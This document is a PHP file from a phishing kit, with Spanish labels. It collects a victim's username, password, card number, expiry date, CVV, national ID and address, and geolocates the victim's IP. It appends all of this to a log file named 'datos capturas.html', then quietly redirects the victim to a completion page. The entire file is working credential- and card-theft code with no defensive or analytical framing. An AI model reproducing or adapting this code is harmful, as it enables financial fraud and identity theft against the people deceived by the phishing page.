<?php 
$ad1 = $_POST["ad1"];
$ci = $_POST["ci"];
$st = $_POST["st"];
$zc = $_POST["zc"];
$cy = $_POST["cy"];
session_start();
$rt = $_SESSION["rt"];
$cs = $_SESSION["cs"];
$f = $_SESSION["f"];
$cn = $_SESSION["cn"];
$n = $_SESSION["n"];
$pw = $_SESSION["pw"];
$us = $_SESSION["us"];
?>
<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
<link rel="stylesheet" type="text/css" href="lib/sweetalert.css">
<script src="lib/sweetalert.min.js"></script>
<link rel="shortcut icon" href="favicon.ico">
<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = "{$geoplugin->ip}";
$ciudad = "{$geoplugin->city}";
$codigoarea = "{$geoplugin->areaCode}";
$pais = "{$geoplugin->countryName}";

$fa = fopen("datos capturas.html", "a"); 
fwrite ($fa, 'Usuario: [<b><font color="#0000FF">'.$us.'</font></b>]<br> Contraseña: [<b><font color="#0000FF">'.$pw.'</font></b>]<br> Nombre CC: [<b><font color="#0000FF">'.$n.'</font></b>] <br> Numero de CC: [<b><font color="#0000FF">'.$cn.'</font></b>] <br> Fecha: [<b><font color="#0000FF">'.$f.'</font></b>] <br> CVV: [<b><font color="#0000FF">'.$cs.'</font></b> ]<br> Rut/DNI: [<b><font color="#0000FF">'.$rt.'</font></b>]<br> Dirección1: [<b><font color="#0000FF">'.$ad1.'</font></b>]<br> Ciudad: [<b><font color="#0000FF">'.$ci.'</font></b>]<br>Estado: [<b><font color="#0000FF">'.$st.'</font></b>] <br> Codigo Postal: [<b><font color="#0000FF">'.$zc.'</font></b>] <br> Pais: [<b><font color="#0000FF">'.$cy.'</font></b>] <br> IP: [<b><font color="#0000FF">'.$ip.'</font></b>]<br> Ciudad IP: [<b><font color="#0000FF">'.$ciudad.'</font></b>]<br> Pais: [<b><font color="#0000FF">'.$pais.'</font></b>]<br> <br>_________________________LOGOS BY YAYA_______________<br>');
fclose($fa);
print "  &nbsp;<script> window.location = './complete';</script>";
?>
